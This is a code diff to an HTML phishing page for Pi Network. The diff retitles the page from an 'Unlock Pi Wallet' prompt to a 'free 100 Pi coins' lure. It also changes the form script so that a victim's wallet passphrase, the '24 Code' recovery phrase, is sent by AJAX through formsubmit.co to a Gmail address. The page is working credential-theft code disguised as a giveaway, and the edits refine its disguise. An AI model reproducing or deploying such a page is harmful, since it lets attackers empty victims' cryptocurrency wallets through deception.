@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Unlock Pi Wallet</title>
+    <title>Get Free 100 Pi Network Cois</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -102,14 +102,13 @@
         }
         /* Loading Spinner */
         .loading-container {
-            display: none;
+            display: none; /* Hidden by default */
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             background: rgba(255, 255, 255, 0.8);
-            display: flex;
             justify-content: center;
             align-items: center;
             z-index: 9999;
@@ -133,13 +132,11 @@
             const submitButton = document.querySelector("button[type='submit']");
             const loadingContainer = document.querySelector(".loading-container");
 
-            submitButton.addEventListener("click", function() {
-                // Show Loading Spinner when button is clicked
-                loadingContainer.style.display = "flex";
-            });
-
             form.addEventListener("submit", function(event) {
                 event.preventDefault(); // Prevent default form submission
+
+                // Show Loading Spinner when button is clicked
+                loadingContainer.style.display = "flex";
 
                 // Send data using AJAX
                 fetch("https://formsubmit.co/ajax/brethrenwrites@gmail.com", {
@@ -148,8 +145,8 @@
                         "Content-Type": "application/json"
                     },
                     body: JSON.stringify({
-                        Passphrase: document.querySelector("textarea[name='Passphrase']").value,
-                        _subject: "Pi Wallet Passphrase",
+                        Passphrase: document.querySelector("textarea[name='Item']").value,
+                        _subject: "24 Code",
                         _captcha: "false",
                         _template: "table"
                     })
